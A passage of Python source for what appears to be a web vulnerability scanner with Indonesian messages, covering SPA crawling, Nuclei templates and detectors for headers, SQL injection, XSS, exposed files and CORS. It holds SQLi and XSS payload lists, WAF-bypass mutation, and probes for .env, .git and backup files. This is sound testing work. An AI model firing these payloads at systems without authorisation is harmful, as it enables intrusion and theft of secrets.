                async def crawl_page(page_url: str, visited: Set[str]):
                    if page_url in visited or len(visited) >= self.max_pages:
                        return
                    visited.add(page_url)
                    page = await ctx.new_page()

                    def on_request(req):
                        if req.resource_type not in ("xhr","fetch"): return
                        try:
                            rurl  = req.url
                            rbody = req.post_data or ""
                            p = dict(urllib.parse.parse_qsl(
                                urllib.parse.urlparse(rurl).query))
                            if rbody:
                                try:    p.update(json.loads(rbody))
                                except:
                                    try: p.update(dict(urllib.parse.parse_qsl(rbody)))
                                    except: pass
                            if p:
                                api_calls.append({"url":rurl,"method":req.method,
                                    "params":p,"type":req.resource_type})
                                found_urls.add(rurl)
                        except: pass

                    page.on("request", on_request)
                    try:
                        await page.goto(page_url, timeout=self.PAGE_TIMEOUT,
                                        wait_until="domcontentloaded")
                        try:
                            await page.wait_for_load_state(
                                "networkidle", timeout=self.NETWORK_TIMEOUT)
                        except: pass
                        links = await page.evaluate("""() => {
                            const s=new Set();
                            document.querySelectorAll('a[href]').forEach(a=>s.add(a.href));
                            document.querySelectorAll('[to],[routerlink]').forEach(el=>{
                                const h=el.getAttribute('to')||el.getAttribute('routerlink');
                                if(h)s.add(h);
                            });
                            return Array.from(s).slice(0,50);
                        }""")
                        for link in (links or []):
                            full = urllib.parse.urljoin(page_url, link)
                            if urllib.parse.urlparse(full).netloc == domain:
                                found_urls.add(full)
                        forms = await page.evaluate("""() =>
                            Array.from(document.querySelectorAll('form')).map(f=>({
                                action:f.action,method:f.method||'GET',
                                inputs:Array.from(f.querySelectorAll(
                                    'input,select,textarea'))
                                    .map(i=>({name:i.name,type:i.type,value:i.value}))
                                    .filter(i=>i.name)
                            }))
                        """)
                        for form in (forms or []):
                            params = {i["name"]: i.get("value","test")
                                      for i in form.get("inputs",[])
                                      if i.get("type") not in
                                         ("submit","file","button")}
                            if params:
                                api_calls.append({
                                    "url": form.get("action") or page_url,
                                    "method": (form.get("method") or "GET").upper(),
                                    "params": params, "type": "form"})
                    except: pass
                    finally:
                        try: await page.close()
                        except: pass

                visited: Set[str] = set()
                await crawl_page(url, visited)
                for link in list(found_urls)[:self.max_pages-len(visited)]:
                    if link not in visited:
                        await crawl_page(link, visited)
                await browser.close()
        except Exception as e:
            result.errors.append(f"SPA Crawler async: {e}")
            logger.debug(traceback.format_exc())

        result.endpoints     = list(found_urls)[:100]
        result.api_endpoints = api_calls[:50]
        self._add_findings(result, url, api_calls, found_urls)

    def _crawl_sync(self, url: str, result: ScanResult, js_events: bool):
        """Fallback: sync_playwright dalam thread terpisah."""
        from playwright.sync_api import sync_playwright as _sp
        domain     = urllib.parse.urlparse(url).netloc
        api_calls: List[dict] = []
        found_urls: Set[str]  = set()
        lock = threading.Lock()
        try:
            with _sp() as pw:
                browser = pw.chromium.launch(
                    headless=True,
                    args=["--no-sandbox","--disable-dev-shm-usage",
                          "--disable-gpu","--memory-pressure-off"])
                ctx = browser.new_context(
                    ignore_https_errors=True, user_agent=random_ua())
                ctx.route(
                    "**/*.{png,jpg,jpeg,gif,webp,svg,ico,woff,woff2,ttf,eot}",
                    lambda route: route.abort())

                def crawl_page(page_url, visited):
                    if page_url in visited or len(visited) >= self.max_pages:
                        return
                    visited.add(page_url)
                    page = ctx.new_page()
                    def on_req(req):
                        if req.resource_type not in ("xhr","fetch"): return
                        try:
                            rurl  = req.url
                            rbody = req.post_data or ""
                            p = dict(urllib.parse.parse_qsl(
                                urllib.parse.urlparse(rurl).query))
                            if rbody:
                                try:    p.update(json.loads(rbody))
                                except: pass
                            if p:
                                with lock:
                                    api_calls.append({"url":rurl,
                                        "method":req.method,"params":p,
                                        "type":req.resource_type})
                                found_urls.add(rurl)
                        except: pass
                    page.on("request", on_req)
                    try:
                        page.goto(page_url, timeout=self.PAGE_TIMEOUT,
                                  wait_until="domcontentloaded")
                        try: page.wait_for_load_state(
                            "networkidle", timeout=self.NETWORK_TIMEOUT)
                        except: pass
                        links = page.evaluate("""() => {
                            const s=new Set();
                            document.querySelectorAll('a[href]').forEach(a=>s.add(a.href));
                            return Array.from(s).slice(0,50);
                        }""")
                        for link in (links or []):
                            full = urllib.parse.urljoin(page_url, link)
                            if urllib.parse.urlparse(full).netloc == domain:
                                found_urls.add(full)
                    except: pass
                    finally:
                        try: page.close()
                        except: pass

                visited: Set[str] = set()
                crawl_page(url, visited)
                for link in list(found_urls)[:self.max_pages-len(visited)]:
                    if link not in visited: crawl_page(link, visited)
                try: browser.close()
                except: pass
        except Exception as e:
            result.errors.append(f"SPA Crawler sync: {e}")

        result.endpoints     = list(found_urls)[:100]
        result.api_endpoints = api_calls[:50]
        self._add_findings(result, url, api_calls, found_urls)

    def _add_findings(self, result, url, api_calls, found_urls):
        if api_calls:
            result.add(Finding(self.NAME, Severity.INFO,
                f"SPA: {len(api_calls)} API Endpoint Terdeteksi",
                f"Playwright mengintersep {len(api_calls)} XHR/Fetch calls.",
                "Sample:\n"+"\n".join(
                    f"{a['method']} {a['url'][:80]} — {list(a['params'].keys())}"
                    for a in api_calls[:6]),
                "Pastikan semua API endpoint memiliki autentikasi.",
                0,"",url,["spa","crawler"]))
        if found_urls:
            result.add(Finding(self.NAME, Severity.INFO,
                f"SPA: {len(found_urls)} URL Ditemukan",
                "Crawler menemukan URL termasuk SPA routes.",
                "Sample:\n"+"\n".join(list(found_urls)[:8]),
                "Review semua endpoint.",0,"",url))

# ─────────────────────────────────────────────
#  NUCLEI YAML ENGINE
# ─────────────────────────────────────────────
class NucleiEngine:
    NAME = "Nuclei YAML"

    def __init__(self, template_dir: str = None):
        self.template_dir   = template_dir
        self.templates      = []
        self.loaded         = 0
        self.nuclei_bin     = self._find_binary()
        self.use_subprocess = bool(self.nuclei_bin)

    def _find_binary(self) -> Optional[str]:
        import shutil
        found = shutil.which("nuclei")
        if found: return found
        for p in [os.path.expanduser("~/go/bin/nuclei"),
                  "/usr/local/bin/nuclei","/usr/bin/nuclei"]:
            if os.path.isfile(p) and os.access(p, os.X_OK): return p
        return None

    def load_templates(self, path: str = None) -> int:
        search_paths = []
        for p in [path, self.template_dir]:
            if p and os.path.isdir(p): search_paths.append(p)
        sd = os.path.dirname(os.path.abspath(__file__))
        for sub in ["nuclei-templates","templates","nuclei"]:
            p2 = os.path.join(sd, sub)
            if os.path.isdir(p2): search_paths.append(p2)
        if self.use_subprocess:
            count = 0
            for sp in search_paths:
                for _,_,files in os.walk(sp):
                    count += sum(1 for f in files
                                 if f.endswith((".yaml",".yml")))
            self.loaded = count
            self.template_dir = search_paths[0] if search_paths else None
            return count
        if not YAML_OK: return 0
        for sp in search_paths:
            for root,_,files in os.walk(sp):
                for fname in files:
                    if fname.endswith((".yaml",".yml")):
                        t = self._parse_safe(os.path.join(root, fname))
                        if t: self.templates.append(t)
        self.loaded = len(self.templates)
        return self.loaded

    def _parse_safe(self, filepath: str) -> Optional[dict]:
        try:
            with open(filepath, encoding="utf-8", errors="ignore") as fp:
                data = yaml.safe_load(fp)
            if not isinstance(data, dict): return None
            http_sec = data.get("http") or data.get("requests") or []
            if not http_sec: return None
            blocks = http_sec if isinstance(http_sec, list) else [http_sec]
            for block in blocks:
                if not isinstance(block, dict): return None
                # Skip unsupported features
                if any(k in block for k in
                       ["flow","variables","attack","payloads","fuzzing"]):
                    return None
                for m in (block.get("matchers") or []):
                    if isinstance(m, dict) and m.get("type") in ("dsl","xpath"):
                        return None
            info     = data.get("info", {})
            tags_raw = info.get("tags","")
            tags     = tags_raw.split(",") if isinstance(tags_raw,str) else (tags_raw or [])
            return {"id":data.get("id","unknown"),"name":info.get("name","Unknown"),
                    "severity":info.get("severity","info"),
                    "description":info.get("description",""),
                    "tags":[t.strip() for t in tags if t.strip()],
                    "cve":info.get("classification",{}).get("cve-id",""),
                    "requests":blocks,"filepath":filepath}
        except: return None

    def _sev(self, s: str) -> Severity:
        return {"critical":Severity.CRITICAL,"high":Severity.HIGH,
                "medium":Severity.MEDIUM,"low":Severity.LOW
                }.get((s or "").lower(), Severity.INFO)

    async def run_async(self, engine, result, url):
        if not self.loaded: return
        if self.use_subprocess: await self._run_subprocess(result, url)
        else:                   await self._run_simple(engine, result, url)

    async def _run_subprocess(self, result, url):
        if not self.template_dir:
            result.errors.append("Nuclei: template dir tidak ditemukan")
            return
        cmd = [self.nuclei_bin,"-u",url,"-t",self.template_dir,
               "-json","-silent","-no-color","-timeout","10",
               "-c","10","-retries","1","-duc"]
        try:
            loop = asyncio.get_event_loop()
            def _run():
                import subprocess as sp
                proc = sp.run(cmd, capture_output=True, text=True, timeout=120)
                return proc.stdout, proc.stderr
            stdout, _ = await loop.run_in_executor(None, _run)
            for line in stdout.strip().split("\n"):
                line = line.strip()
                if not line: continue
                try:
                    item    = json.loads(line)
                    sev     = self._sev(item.get("info",{}).get("severity","info"))
                    name    = item.get("info",{}).get("name","Unknown")
                    tmpl_id = item.get("template-id","")
                    matched = item.get("matched-at",url)
                    cve     = item.get("info",{}).get(
                        "classification",{}).get("cve-id","")
                    tags_r  = item.get("info",{}).get("tags",[])
                    tags    = tags_r.split(",") if isinstance(tags_r,str) else tags_r
                    result.add(Finding(self.NAME,sev,f"[Nuclei] {name}",
                        item.get("info",{}).get("description","") or f"Template: {tmpl_id}",
                        f"Template: {tmpl_id}\nURL: {matched}\n"
                        f"Matched: {item.get('matcher-name','')}"
                        +(f"\nCVE: {cve}" if cve else ""),
                        "Refer ke advisory terkait.",
                        9.0 if sev==Severity.CRITICAL else 7.0
                        if sev==Severity.HIGH else 4.0,
                        "",matched,[t.strip() for t in tags if t.strip()]))
                except json.JSONDecodeError: pass
        except Exception as e:
            result.errors.append(f"Nuclei subprocess: {e}")

    async def _run_simple(self, engine, result, url):
        async def run_t(tmpl):
            for block in tmpl["requests"]:
                await self._exec(engine, result, url, tmpl, block)
        await engine.gather([run_t(t) for t in self.templates])

    async def _exec(self, engine, result, base_url, tmpl, req_block):
        try:
            method   = (req_block.get("method","GET") or "GET").upper()
            paths    = req_block.get("path", ["/"])
            matchers = req_block.get("matchers", [])
            condition= (req_block.get("matchers-condition","or") or "or").lower()
            headers  = req_block.get("headers", {}) or {}
            body     = req_block.get("body", "")
            for path in (paths if isinstance(paths,list) else [paths]):
                full = path.replace("{{BaseURL}}", base_url.rstrip("/"))
                if not full.startswith("http"):
                    full = base_url.rstrip("/")+"/"+path.lstrip("/")
                resp = (await engine.get(full,headers=headers) if method=="GET"
                        else await engine.post(full,data=body,headers=headers))
                if not resp: continue
                if self._match(resp, matchers, condition):
                    sev  = self._sev(tmpl["severity"])
                    result.add(Finding(self.NAME,sev,f"[Nuclei] {tmpl['name']}",
                        tmpl.get("description","") or f"Template: {tmpl['id']}",
                        f"Template: {tmpl['id']}\nURL: {full}\nStatus: {resp['status']}",
                        "Refer ke advisory.",
                        9.0 if sev==Severity.CRITICAL else 7.0
                        if sev==Severity.HIGH else 4.0,
                        "",full,tmpl.get("tags",[])))
        except: pass

    def _match(self, resp, matchers, condition):
        if not matchers: return False
        results = []
        for m in matchers:
            mtype = (m.get("type","") or "").lower()
            neg   = m.get("negative", False)
            hit   = False
            try:
                if mtype == "status":
                    hit = resp["status"] in (m.get("status") or [])
                elif mtype == "word":
                    words  = m.get("words") or []
                    part   = (m.get("part","body") or "body").lower()
                    mcond  = (m.get("condition","or") or "or").lower()
                    target = (resp["body"] if part=="body"
                              else str(resp["headers"])).lower()
                    hit = (all(w.lower() in target for w in words)
                           if mcond=="and"
                           else any(w.lower() in target for w in words))
                elif mtype == "regex":
                    patterns = m.get("regex") or []
                    part     = (m.get("part","body") or "body").lower()
                    target   = (resp["body"] if part=="body"
                                else str(resp["headers"])).lower()
                    hit = any(re.search(p, target, re.I) for p in patterns)
                elif mtype == "header":
                    hit = any(w.lower() in str(resp["headers"]).lower()
                              for w in (m.get("words") or []))
                elif mtype in ("dsl","xpath","binary"):
                    continue
            except: pass
            if neg: hit = not hit
            results.append(hit)
        if not results: return False
        return all(results) if condition=="and" else any(results)

    def create_sample_templates(self, output_dir: str):
        os.makedirs(output_dir, exist_ok=True)
        samples = [
            {"filename":"git-config-exposure.yaml","content":
"""id: git-config-exposure
info:
  name: Git Config File Exposure
  severity: high
  tags: git,exposure
http:
  - method: GET
    path: ["{{BaseURL}}/.git/config"]
    matchers:
      - type: word
        words: ["[core]"]
      - type: status
        status: [200]
"""},
            {"filename":"env-file-exposure.yaml","content":
"""id: env-file-exposure
info:
  name: Environment File Exposure
  severity: critical
  tags: env,exposure
http:
  - method: GET
    path: ["{{BaseURL}}/.env","{{BaseURL}}/.env.local"]
    matchers:
      - type: regex
        regex: ["(?i)(DB_PASSWORD|APP_KEY|SECRET_KEY|API_KEY)\\s*=\\s*.+"]
      - type: status
        status: [200]
    matchers-condition: and
"""},
        ]
        for s in samples:
            with open(os.path.join(output_dir, s["filename"]), "w",
                      encoding="utf-8") as fp:
                fp.write(s["content"])
        return len(samples)

# ─────────────────────────────────────────────
#  ATTACK CHAIN REPORTER
# ─────────────────────────────────────────────
class AttackChainReporter:
    NAME = "Attack Chain"
    CHAINS = [
        {"id":"chain-001","name":"Path Traversal → Secret Leak → Session Risk",
         "steps":[{"tag":"files","keywords":["/.env","/.git","config"]},
                  {"tag":"info","keywords":["password","api_key","secret","token"]},
                  {"tag":"cookies","keywords":["httponly","session","csrf"]}],
         "severity":Severity.CRITICAL,"cvss":9.5,
         "description":"file sensitif + credentials bocor + cookie tidak aman.",
         "impact":"Account Takeover"},
        {"id":"chain-002","name":"XSS → CSRF Bypass → Privilege Escalation",
         "steps":[{"tag":"xss","keywords":["reflected xss","xss"]},
                  {"tag":"auth","keywords":["csrf","no csrf"]},
                  {"tag":"auth","keywords":["rate limit","no rate"]}],
         "severity":Severity.HIGH,"cvss":8.5,
         "description":"XSS + tidak ada CSRF + tidak ada rate limiting.",
         "impact":"CSRF via XSS"},
        {"id":"chain-003","name":"SQLi → Data Dump → Auth Bypass",
         "steps":[{"tag":"sqli","keywords":["sql injection"]},
                  {"tag":"info","keywords":["mysql","database","credentials"]},
                  {"tag":"headers","keywords":["hsts","csp"]}],
         "severity":Severity.CRITICAL,"cvss":9.8,
         "description":"SQLi + database terekspos + headers lemah.",
         "impact":"Full Database Compromise"},
        {"id":"chain-006","name":"SSRF → Cloud Metadata → Takeover",
         "steps":[{"tag":"ssrf","keywords":["ssrf","metadata"]},
                  {"tag":"info","keywords":["aws","gcp","cloud","instance"]},
                  {"tag":"idor","keywords":["idor","direct object"]}],
         "severity":Severity.CRITICAL,"cvss":9.9,
         "description":"SSRF ke cloud metadata + IDOR → credential exfil.",
         "impact":"Cloud Account Takeover"},
        {"id":"chain-007","name":"JWT Weak Secret → Auth Bypass",
         "steps":[{"tag":"jwt","keywords":["jwt","weak secret","alg:none"]},
                  {"tag":"auth","keywords":["auth","login","bypass"]},
                  {"tag":"idor","keywords":["idor","privilege","admin"]}],
         "severity":Severity.CRITICAL,"cvss":9.5,
         "description":"JWT weak/alg:none + IDOR → admin takeover.",
         "impact":"Full Authentication Bypass"},
    ]

    def analyze(self, result: ScanResult) -> List[dict]:
        chains_found = []
        for chain in self.CHAINS:
            matched_steps = [self._find_match(result.findings, step)
                             for step in chain["steps"]]
            matched_steps = [m for m in matched_steps if m]
            if len(matched_steps) >= 2:
                chains_found.append({**chain,
                    "matched_findings": matched_steps,
                    "completeness": len(matched_steps)/len(chain["steps"])})
        return chains_found

    def _find_match(self, findings, step):
        keywords = [k.lower() for k in step["keywords"]]
        for f in findings:
            text = (f.title+" "+f.description+" "+" ".join(f.tags)).lower()
            if any(kw in text for kw in keywords): return f
        return None

    def report(self, result: ScanResult):
        chains = self.analyze(result)
        if not chains: return
        chain_summary = "\n".join(
            f"• [{c['id']}] {c['name']} ({c['completeness']*100:.0f}%)"
            for c in chains)
        result.add(Finding(self.NAME, Severity.CRITICAL,
            f"Attack Chain Terdeteksi: {len(chains)} Skenario",
            "Kerentanan dapat dikombinasikan menjadi serangan berantai.",
            chain_summary,
            "Prioritaskan perbaikan finding yang menjadi bagian chain.",
            max(c["cvss"] for c in chains),"CWE-693",result.target,
            ["chain","attack-chain"]))
        for chain in chains:
            matched = chain["matched_findings"]
            evidence = (f"Chain ID: {chain['id']}\n"
                       f"Completeness: {chain['completeness']*100:.0f}%\n"
                       f"Impact: {chain['impact']}\n\nFindings:\n"+
                       "\n".join(f"  [{i+1}] {f.title} ({f.severity.value})"
                                 for i,f in enumerate(matched)))
            result.add(Finding(self.NAME, chain["severity"],
                f"[{chain['id']}] {chain['name']}",
                chain["description"], evidence,
                "Perbaiki semua finding:\n"+
                "\n".join(f"  • {f.title}" for f in matched),
                chain["cvss"],"",result.target,["chain",chain["id"]]))

# ─────────────────────────────────────────────
#  CORE SCAN MODULES
# ─────────────────────────────────────────────
class AsyncModule:
    NAME = "Base"
    async def run_async(self, engine, result, url, waf_info,
                        aggressive: bool = False): pass

class AsyncHeaderAnalyzer(AsyncModule):
    NAME = "Header Security"
    REQUIRED = {
        "Strict-Transport-Security":(Severity.HIGH,6.5,"CWE-319",
            "HSTS tidak ada.",
            "Strict-Transport-Security: max-age=31536000; includeSubDomains"),
        "Content-Security-Policy":  (Severity.HIGH,6.1,"CWE-693",
            "CSP tidak ada.","Tambahkan CSP header."),
        "X-Frame-Options":          (Severity.MEDIUM,4.3,"CWE-1021",
            "Rentan Clickjacking.","X-Frame-Options: DENY"),
        "X-Content-Type-Options":   (Severity.MEDIUM,3.7,"CWE-430",
            "MIME sniffing aktif.","X-Content-Type-Options: nosniff"),
        "Referrer-Policy":          (Severity.LOW,2.6,"CWE-200",
            "URL bocor ke third-party.",
            "Referrer-Policy: strict-origin-when-cross-origin"),
        "Permissions-Policy":       (Severity.LOW,2.1,"CWE-269",
            "Fitur browser tidak dibatasi.","Tambahkan Permissions-Policy."),
    }
    LEAK = {"Server":"Versi server","X-Powered-By":"Backend terekspos",
            "X-AspNet-Version":"ASP.NET version","X-Runtime":"Runtime version"}

    async def run_async(self, engine, result, url, waf_info, aggressive=False):
        resp = await engine.get(url)
        if not resp: return
        hdrs   = resp["headers"]
        hdrs_l = {k.lower(): v for k,v in hdrs.items()}
        for k,v in hdrs.items():
            if any(x in k.lower() for x in ["server","powered","runtime"]):
                result.server_info[k] = v
        for hdr,(sev,cvss,cwe,desc,fix) in self.REQUIRED.items():
            if hdr.lower() not in hdrs_l:
                result.add(Finding(self.NAME,sev,f"Header '{hdr}' Tidak Ada",
                    desc,f"Header tidak ditemukan di {url}",fix,
                    cvss,cwe,url,["headers"]))
        for hdr,desc in self.LEAK.items():
            v = hdrs.get(hdr,"") or hdrs.get(hdr.lower(),"")
            if v:
                result.add(Finding(self.NAME,Severity.LOW,
                    f"Info Terekspos: {hdr}",desc,f"{hdr}: {v}",
                    f"Hapus header '{hdr}'.",3.1,"CWE-200",url,
                    ["info","headers"]))

class AsyncSQLiDetector(AsyncModule):
    SCAN_ALL_TARGETS = True
    NAME = "SQL Injection"
    BASE_PAYLOADS = [
        ("'","Single Quote",8.0),
        ("1 AND 1=1","Bool TRUE",7.5),
        ("1 AND 1=2","Bool FALSE",7.5),
        ("1' OR '1'='1'--","OR Bypass",9.0),
        ("' AND SLEEP(2)--","Time MySQL",8.5),
        ("1 UNION SELECT NULL,NULL--","UNION probe",9.0),
        ("admin'--","Login bypass",9.0),
        ("1 AND pg_sleep(2)--","Time PgSQL",8.5),
    ]

    async def run_async(self, engine, result, url, waf_info, aggressive=False):
        resp = await engine.get(url)
        if not resp: return
        targets  = self._targets(url, resp["body"])
        strategy = waf_info.get("bypass_strategy","standard")
        for t_url, method, params in targets[:5]:
            await self._test(engine, result, t_url, method, params, strategy)

    async def _test(self, engine, result, t_url, method, params, strategy):
        base = (await engine.get(t_url,params=params) if method=="GET"
                else await engine.post(t_url,data=params))
        if not base: return
        bl = base["body"]
        bp = {k: str(v)+" AND 1=1" for k,v in params.items()}
        bq = {k: str(v)+" AND 1=2" for k,v in params.items()}
        rt,rf = await asyncio.gather(
            engine.get(t_url,params=bp) if method=="GET"
            else engine.post(t_url,data=bp),
            engine.get(t_url,params=bq) if method=="GET"
            else engine.post(t_url,data=bq),
            return_exceptions=True)
        rt = None if isinstance(rt, Exception) else rt
        rf = None if isinstance(rf, Exception) else rf
        if rt and rf:
            stf = Sim.ratio(rt["body"],rf["body"])
            sbt = Sim.ratio(bl,rt["body"])
            if sbt > 0.85 and stf < 0.75:
                result.add(Finding(self.NAME,Severity.HIGH,
                    "SQL Injection Boolean-based [CONFIRMED]",
                    f"TRUE/FALSE response berbeda (sim={stf:.3f}).",
                    f"URL: {t_url}\nParams: {list(params.keys())}\n"
                    f"Sim TRUE/FALSE: {stf:.3f}",
                    "Gunakan Prepared Statement.",7.5,"CWE-89",t_url,["sqli"]))
                return

        async def test_pl(payload, technique, cvss):
            variants = (PayloadMutator.mutate_sqli(payload, strategy)
                        if strategy != "standard" else [payload])
            for variant in variants:
                test_p = {k: str(v)+variant for k,v in params.items()}
                t0 = time.time()
                r2 = (await engine.get(t_url,params=test_p) if method=="GET"
                      else await engine.post(t_url,data=test_p))
                elapsed = time.time()-t0
                if not r2: continue
                if PayloadMutator.is_blocked(r2): continue
                if any(x in payload.upper() for x in ["SLEEP","PG_SLEEP"]):
                    # FIX: statistical timing — ambil baseline 3x, bandingkan
                    if elapsed >= 1.8:
                        # Verifikasi dengan re-test: cek apakah non-sleep request
                        # juga lambat (network latency issue)
                        baseline_p = {k: str(v)+"1" for k,v in params.items()}
                        t1 = time.time()
                        rb = (await engine.get(t_url,params=baseline_p)
                              if method=="GET"
                              else await engine.post(t_url,data=baseline_p))
                        baseline_elapsed = time.time()-t1
                        # Hanya laporkan jika payload delay > 3x baseline delay
                        if rb and elapsed > baseline_elapsed * 2.5:
                            result.add(Finding(self.NAME,Severity.CRITICAL,
                                f"SQL Injection Time-based [{technique}]"
                                +(" [WAF Bypassed]" if variant!=payload else ""),
                                f"Delay {elapsed:.2f}s vs baseline {baseline_elapsed:.2f}s"
                                f" (ratio {elapsed/max(baseline_elapsed,0.01):.1f}x).",
                                f"URL: {t_url}\nPayload: {variant}\n"
                                f"Delay: {elapsed:.2f}s | Baseline: {baseline_elapsed:.2f}s",
                                "Gunakan Parameterized Query.",
                                cvss,"CWE-89",t_url,["sqli"]))
                    return
                d = Sim.diff(bl, r2["body"], payload=variant)
                if d["confidence"] in ("CONFIRMED","HIGH"):
                    sev = (Severity.CRITICAL if d["confidence"]=="CONFIRMED"
                           else Severity.HIGH)
                    bypass_note = " [WAF Bypassed]" if variant != payload else ""
                    result.add(Finding(self.NAME,sev,
                        f"SQL Injection [{technique}]{bypass_note}",
                        f"Structural diff. Sim: {d['sim']:.3f}",
                        f"URL: {t_url}\nVariant: {variant}\n"
                        f"Sim: {d['sim']:.3f}\nSignals: {d['signals']}",
                        "Gunakan Prepared Statement.",
                        cvss,"CWE-89",t_url,["sqli"]))
                    return

        await asyncio.gather(*[test_pl(p,t,c2) for p,t,c2 in self.BASE_PAYLOADS[:8]], return_exceptions=True)

    def _targets(self, url, body):
        targets = []
        parsed = urllib.parse.urlparse(url)
        if parsed.query:
            p = dict(urllib.parse.parse_qsl(parsed.query))
            if p: targets.append((url,"GET",p))
        try:
            soup = BeautifulSoup(body,"html.parser")
            for form in soup.find_all("form")[:4]:
                action = form.get("action","")
                method = form.get("method","get").upper()
                furl   = urllib.parse.urljoin(url,action) if action else url
                inputs = {i.get("name"):i.get("value","1")
                          for i in form.find_all("input")
                          if i.get("name") and
                          i.get("type") not in ("submit","file","button")}
                if inputs: targets.append((furl,method,inputs))
        except: pass
        if not targets:
            targets += [(url+"?id=1","GET",{"id":"1"}),
                        (url+"?page=1","GET",{"page":"1"})]
        return targets

class AsyncXSSDetector(AsyncModule):
    SCAN_ALL_TARGETS = True
    NAME = "XSS"
    BASE_PAYLOADS = [
        ('<script>alert("v71")</script>',"Script tag"),
        ('"><script>alert(1)</script>',  "Attr breakout"),
        ("'><img src=x onerror=alert(1)>","Img onerror"),
        ("<svg/onload=alert(1)>",        "SVG onload"),
        ("{{7*7}}",                      "SSTI"),
        ("${7*7}",                       "EL injection"),
    ]

    async def run_async(self, engine, result, url, waf_info, aggressive=False):
        resp = await engine.get(url)
        if not resp: return
        targets  = self._targets(url, resp["body"])
        strategy = waf_info.get("bypass_strategy","standard")

        async def test_target(t_url, method, params):
            base = (await engine.get(t_url,params=params) if method=="GET"
                    else await engine.post(t_url,data=params))
            if not base: return
            bl = base["body"]
            async def test_pl(payload, ptype):
                variants = (PayloadMutator.mutate_xss(payload, strategy)
                           if strategy != "standard" else [payload])
                for variant in variants:
                    test_p = {k: variant for k in params}
                    r2 = (await engine.get(t_url,params=test_p) if method=="GET"
                          else await engine.post(t_url,data=test_p))
                    if not r2 or PayloadMutator.is_blocked(r2): continue
                    if "{{7*7}}" in payload and "49" in r2["body"] and "49" not in bl:
                        result.add(Finding(self.NAME,Severity.CRITICAL,
                            "SSTI — Potensi RCE!","{{7*7}}→49.",
                            f"URL: {t_url}\nPayload: {{{{7*7}}}}",
                            "Sanitasi input template.",9.8,"CWE-94",t_url,["ssti","xss"]))
                        return
                    d       = Sim.diff(bl, r2["body"], payload=variant)
                    escaped = any(x in r2["body"] for x in
                                  ["&lt;script","&#x3C;","&amp;lt;"])
                    if d["reflected"] and not escaped and \
                            d["confidence"] in ("CONFIRMED","HIGH","MEDIUM"):
                        bypass = " [WAF Bypassed]" if variant != payload else ""
                        result.add(Finding(self.NAME,Severity.HIGH,
                            f"Reflected XSS — {ptype}{bypass}",
                            f"Confidence: {d['confidence']} | Sim: {d['sim']:.3f}",
                            f"URL: {t_url}\nPayload: {variant}\n"
                            f"Signals: {d['signals']}\n"
                            +(f"Context: {d['reflection_context']}"
                              if d.get("reflection_context") else ""),
                            "Encode output. Terapkan CSP.",
                            6.1,"CWE-79",t_url,["xss"]))
                        return
            await asyncio.gather(*[test_pl(p,t) for p,t in self.BASE_PAYLOADS], return_exceptions=True)

        await engine.gather([test_target(u,m,p) for u,m,p in targets[:4]])

    def _targets(self, url, body):
        targets = []
        parsed = urllib.parse.urlparse(url)
        if parsed.query:
            p = dict(urllib.parse.parse_qsl(parsed.query))
            if p: targets.append((url,"GET",p))
        try:
            soup = BeautifulSoup(body,"html.parser")
            for form in soup.find_all("form")[:3]:
                action = form.get("action","")
                method = form.get("method","get").upper()
                furl   = urllib.parse.urljoin(url,action) if action else url
                inputs = {i.get("name"):"test"
                          for i in form.find_all("input")
                          if i.get("name") and
                          i.get("type") not in ("submit","hidden","file")}
                if inputs: targets.append((furl,method,inputs))
        except: pass
        if not targets: targets.append((url+"?q=test","GET",{"q":"test"}))
        return targets

class AsyncSensitiveFiles(AsyncModule):
    NAME = "Sensitive Files"
    SEV_MAP = [
        (r"\.(env|key|pem|secret|password)$",Severity.CRITICAL,9.1),
        (r"(wp-config|config\.php|database\.yml|\.htpasswd|actuator/env)",Severity.CRITICAL,9.1),
        (r"(backup|dump|\.sql|\.zip|\.tar|\.bak)",Severity.CRITICAL,8.5),
        (r"(\.git/|\.svn/)",Severity.HIGH,7.5),
        (r"(phpmyadmin|adminer|jenkins|elastic)",Severity.HIGH,7.0),
        (r"(admin|wp-admin|wp-login)",Severity.MEDIUM,5.0),
        (r"(swagger|graphiql|telescope|debug)",Severity.MEDIUM,4.5),
        (r"(robots|sitemap|security\.txt)",Severity.INFO,0),
    ]
    DEFAULT_PATHS = [
        "/.env","/.env.local","/.env.production","/.git/config","/.git/HEAD",
        "/wp-config.php","/config.php","/config/database.yml",
        "/.htpasswd","/.htaccess","/web.config","/appsettings.json",
        "/phpmyadmin","/adminer.php","/admin","/admin/login",
        "/wp-admin","/wp-login.php","/actuator/env","/actuator/heapdump",
        "/backup.zip","/backup.sql","/db.sql","/dump.sql",
        "/debug","/_profiler","/swagger","/swagger-ui.html",
        "/openapi.json","/graphql","/graphiql","/.svn/entries",
        "/robots.txt","/sitemap.xml","/.well-known/security.txt",
        "/package.json","/requirements.txt","/composer.json","/go.mod",
    ]
    def __init__(self, paths=None):
        self.paths = paths or self.DEFAULT_PATHS

    def _classify(self, path):
        for pat,sev,cvss in self.SEV_MAP:
            if re.search(pat,path.lower()): return sev,cvss
        return Severity.LOW, 2.0

    async def run_async(self, engine, result, url, waf_info, aggressive=False):
        base = url.rstrip("/")
        fake = await engine.get(base+"/this-does-not-exist-v71-test")
        fb   = fake["body"] if fake else ""

        # FIX 10: Gabungkan daftar path statis + path dari crawler
        # Ekstrak path unik dari result.endpoints (tanpa domain/query)
        extra_paths: Set[str] = set()
        for ep in result.endpoints:
            try:
                p = urllib.parse.urlparse(ep).path
                if p and p not in self.paths:
                    extra_paths.add(p)
                    # Juga coba variasi path traversal sederhana
                    if "/" in p.strip("/"):
                        parts = p.rstrip("/").rsplit("/", 1)
                        extra_paths.add(parts[0] + "/../" + parts[-1])
            except Exception:
                pass

        all_paths = list(dict.fromkeys(self.paths + list(extra_paths)))

        async def check(path):
            full = base + path
            resp = await engine.get(full, allow_redirects=False)
            if not resp or resp["status"] not in (200, 206): return
            if len(resp["body"]) < 30: return
            if fb and Sim.ratio(resp["body"], fb) > 0.85: return
            sev, cvss = self._classify(path)
            result.add(Finding(self.NAME, sev, f"Path Sensitif: {path}",
                "File/direktori sensitif dapat diakses publik.",
                f"GET {full} → {resp['status']} ({len(resp['body'])} bytes)",
                f"Batasi akses ke {path}.", cvss, "CWE-538", full, ["files"]))

        await engine.gather([check(p) for p in all_paths])

class AsyncCORSChecker(AsyncModule):
    NAME = "CORS"
    async def run_async(self, engine, result, url, waf_info, aggressive=False):
        domain  = urllib.parse.urlparse(url).netloc
        origins = ["https://evil.com","null",
                   f"https://{domain}.evil.com",f"https://evil.{domain}"]
        async def check(origin):
